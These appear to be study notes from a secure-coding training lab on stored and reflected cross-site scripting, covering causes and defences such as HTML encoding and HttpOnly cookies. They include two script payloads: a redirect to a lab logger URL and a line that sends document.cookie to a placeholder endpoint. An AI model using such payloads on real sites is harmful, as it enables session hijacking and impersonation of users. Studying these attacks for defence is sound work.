# Cross-Site Scripting (XSS)
Occurs when an adversary can inject malicious scripts into a trusted website.
These scripts are then executed by the client's browser without the knowledge of the user

## Stored Cross-Site Scripting
Using a security breach on a website, an attacker can use

```javascript
<script>document.location='https://mi-2eed751c-9561-4ef3-93ea-74a5b268ab33-0.mission.securecodewarrior.com/labSession/v1/labLogger'</script>
```

to redirect the user to another URL.

The application cookie was not configured as HttpOnly, which means that it allows client-side scripts to access the cookie. The description field of the transfer proves vulnerable to Stored XSS, as it does not sanitize user input. By inserting the malicious script and sending it to another user, it is possible to gain access to that user's sensitive information, such as session cookies. Once you get hold of the cookie, you can impersonate that user.

Never trust user input. **Stored Cross-Site Scripting** can be prevented by HTML encoding of untrusted data. Next to that, a secure configuration of cookies will prevent them from being accessed by JavaScript.

## Reflected Cross-Site Scripting

Using trusted company email an attacker can insert html/js code and make it available to clients.

The email feature must clean inputs to avoid malicious scripts.

```javascript
<script>document.location='{ENDPOINT_URL}?cookie='.concat(document.cookie)</script>
```